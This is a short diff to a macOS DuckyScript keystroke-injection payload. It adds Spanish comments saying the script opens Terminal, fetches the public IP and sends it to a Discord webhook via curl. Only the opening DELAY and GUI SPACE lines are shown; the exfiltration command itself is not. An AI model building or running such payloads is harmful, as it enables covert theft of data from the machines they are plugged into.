@@ -1,5 +1,11 @@
-REM Payload Made By bst04
-REM For MacOS
+REM ======================================================
+REM Script hecho por bst04
+REM Funciona en sistemas MacOS
+REM Este script abre la Terminal, obtiene la dirección IP pública
+REM del dispositivo y la envía a un webhook de Discord.
+REM Utiliza curl para enviar la IP sin necesidad de JSON.
+REM ======================================================
+
 DELAY 500
 GUI SPACE
 DELAY 500
